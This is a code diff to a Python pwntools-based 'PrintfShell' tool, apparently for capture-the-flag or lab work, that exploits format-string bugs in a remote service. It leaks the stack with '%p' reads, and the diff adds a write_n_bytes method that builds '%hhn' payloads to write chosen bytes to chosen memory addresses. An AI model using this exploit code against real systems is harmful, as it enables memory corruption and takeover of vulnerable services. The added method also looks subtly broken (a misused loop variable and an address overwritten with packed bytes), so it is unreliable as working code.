@@ -49,7 +49,7 @@ class PrintfShell(shell.Shell):
     def connect(self, address, port):
         port = int(port)
         self.conn = pwnlib.tubes.remote.remote(address, port)
-        logging.info(f"Connected. Awaiting '{self.initial_marker}'")
+        #logging.info(f"Connected. Awaiting '{self.initial_marker}'")
         self.conn.recvuntil(self.initial_marker)
         self.stack_base = None
         self.stack_offset = None
@@ -74,9 +74,7 @@ class PrintfShell(shell.Shell):
         stack = []
         for i in range(1, n+1):
             value = self.read_response(bytes(f"%{i}$p\x00", 'ascii'))
-            print(value)
             stack.append(value)
-        print(stack)
         for index, value in enumerate(stack):
             if value == b"(nil)":
                 value = b"0x0"
@@ -136,6 +134,27 @@ class PrintfShell(shell.Shell):
         command = self.pad(command, 16, b"\x00")
         command += addr
         self.read_response(command) # don't really need to read it beyond housecleaning
+
+    @Command
+    def write_n_bytes(self, addr : int, bs : list):
+        if type(addr) == str:
+            addr = int(addr, 16)
+        count = 0
+        total = len(bs)
+        command = ""
+        for i, n in enumerate(bs):
+            nw = (n - count) % 256
+            if nw != 0:
+                command += f"%{nw}d%{self.stack_offset+1+total+i}$hhn"
+            else: 
+                command += f"d%{self.stack_offset+1+total+total+i}$hhn"
+            count = n
+        command = self.pad(command, (1+total)*16, b"_") # TODO: figure out the whole sep char
+        for n in enumerate(bs):
+            addr = pwnlib.util.packing.p64(addr + i)
+            command += addr
+        self.read_response(command)
+            
 
     @Command
     def read_bytes(self, addr : int, n : int):
